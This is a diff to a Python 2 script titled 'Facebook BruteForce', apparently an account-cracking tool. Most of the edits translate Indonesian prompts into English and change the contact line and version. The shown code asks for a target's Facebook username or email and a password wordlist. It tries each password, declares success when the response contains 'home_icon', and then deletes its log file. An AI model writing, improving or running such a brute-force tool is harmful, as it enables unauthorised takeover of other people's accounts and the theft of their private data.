@@ -3,7 +3,7 @@
         #############################################
         #                                           #
         #       Facebook BruteForce, by budiman     #
-        #       Contact: github.com/und3f1n3        #
+        #       Contact: apaitu285@gmail.com        #
         #                                           #
         #############################################
 
@@ -21,27 +21,24 @@ except ModuleNotFoundError:
 
 time.sleep(0.5)
 print('''
- ____BetaTest  2.9_________________________
+ ____BetaTest  3.0_________________________
 | __ ) _   _  __| / |_ __ ___   __ _| \ | |
 |  _ \| | | |/ _` | | '_ ` _ \ / _` |  \| |
 | |_) | |_| | (_| | | | | | | | (_| | |\  |
 |____/ \__,_|\__,_|_|_| |_| |_|\__,_|_| \_|
-
 ''')
 time.sleep(0.5)
-user = raw_input('[?] Target Username/ID/Email/phone >>> ')
-time.sleep(1.7)
-print '\nmembaca data '+user+' database'
+user = raw_input('[?] Target Username/ID/Email >>> ')
 time.sleep(0.8)
-wrdlstFileName = raw_input('\n[?] ketik wordlist.txt >>> ')
+wrdlstFileName = raw_input('\n[?] Wordlist.txt >>> ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
-    print ('\n[!] file tidak ditemukan!')
+    print ('\n[!] File Not Found!')
     exit()
 
 time.sleep(0.8)
-print '\n\nCracking '+user+' sekarang...'
+print '\n\nCracking '+user+' Now...'
 
 time.sleep(1)
 print '\n#############################################\n'
@@ -64,12 +61,12 @@ for password in wordlist:
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
-                print '[+] Password Ditemukan > '+password 
+                print '[+] Password Found > '+password 
                 dos.close()
                 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                 exit()
             else:
-                print "[!] password salah! > "+str(password)
+                print "[!] Wrong Password! > "+str(password)
         except KeyboardInterrupt:
             print '\n#############################################\n   Exiting..'
             dos.close()
@@ -77,7 +74,7 @@ for password in wordlist:
             exit()
 
 time.sleep(1)
-print 'Sorry, gak ada satupun sandi yang bener, coba racik sendiri.'
+print 'Sorry, none of the passswords in your wordlist is right.'
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
